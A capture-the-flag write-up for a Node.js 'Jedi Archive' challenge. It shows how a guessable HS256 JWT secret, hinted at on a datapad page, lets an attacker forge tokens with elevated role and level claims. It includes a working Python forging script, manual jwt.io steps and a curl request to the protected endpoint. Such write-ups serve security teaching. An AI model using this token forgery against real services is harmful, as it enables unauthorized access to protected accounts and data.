# Jedi Archive #5 - Writeup

## Challenge Description
We are presented with a Node.js web application that acts as a Jedi Archive. It has authentication, an SSRF endpoint, and a "Holocron" that holds the flag.

## Analysis

### 1. Reconnaissance
Checking the source code provided (`server.js`), we see a few interesting endpoints:
*   `/login`: Issues a JWT token with `role: 'padawan'` and `midichlorian_level: 5000`.
*   `/archives/holocron`: The target endpoint. It requires a JWT token with `role: 'jedi'` and `midichlorian_level > 15000`.
*   `/datapad`: Displays a hint about Yoda's training planet.
*   `/ssrf`: An endpoint vulnerable to Server-Side Request Forgery, though heavily filtered.

### 2. The Vulnerability
The core vulnerability lies in the JWT implementation. The application uses a symmetric signature algorithm (`HS256`) to sign tokens. The security of this scheme depends entirely on the secrecy of the signing key (`HMAC_SECRET`).

Looking at `server.js`:
```javascript
const HMAC_SECRET = process.env.HMAC_SECRET || 'dagobah';
```

And visiting `/datapad`:
```text
"Master Yoda once said: \"To learn from the swamp, one must live in the swamp.
Yoda trained for years on planet: *****""
```
The text clearly refers to **Dagobah**, the planet where Yoda trained Luke Skywalker. This confirms the secret key is likely `dagobah`.

### 3. The Exploit
Since we know the secret key (`dagobah`) and the algorithm (`HS256`), we can forge a valid JWT token with arbitrary claims. The server trusts the token if the signature matches.

We need to create a token with:
*   `role`: `'jedi'` (to bypass the role check)
*   `midichlorian_level`: A number greater than 15000 (to bypass the level check)

## Solution Script

Here is a Python script to generate the forged token and retrieve the flag:

```python
import jwt
import requests
import sys

# Configuration
TARGET_URL = "http://localhost:3000" # Change this to the challenge URL
SECRET_KEY = "dagobah"

def get_flag():
    # 1. Construct the malicious payload
    payload = {
        "sub": "hacker",
        "role": "jedi",
        "midichlorian_level": 20000, # Must be > 15000
        "iat": 1700000000 # Optional: issued at time
    }

    # 2. Sign the token using the secret key
    print(f"[*] Forging JWT with secret: '{SECRET_KEY}'...")
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    
    # In recent PyJWT versions, encode returns a string. 
    # If using older versions it might be bytes, so decode if necessary:
    if isinstance(token, bytes):
        token = token.decode('utf-8')

    print(f"[*] Forged Token: {token}")

    # 3. Send the request to the restricted endpoint
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    print("[*] Sending request to /archives/holocron...")
    try:
        r = requests.get(f"{TARGET_URL}/archives/holocron", headers=headers)
        
        if r.status_code == 200:
            print(f"\n[+] SUCCESS! Flag: {r.json().get('flag')}")
        else:
            print(f"[-] Failed. Status: {r.status_code}")
            print(f"[-] Response: {r.text}")
            
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    get_flag()
```

## Manual Steps (using jwt.io)
1.  Go to [jwt.io](https://jwt.io/).
2.  Select `HS256` as the algorithm.
3.  In the **Payload** section, paste:
    ```json
    {
      "sub": "hacker",
      "role": "jedi",
      "midichlorian_level": 20000
    }
    ```
4.  In the **Verify Signature** section, enter `dagobah` in the "your-256-bit-secret" field.
5.  Copy the generated encoded token from the left side.
6.  Send a GET request:
    ```bash
    curl -H "Authorization: Bearer <YOUR_TOKEN>" http://<challenge-ip>:3000/archives/holocron
    ```
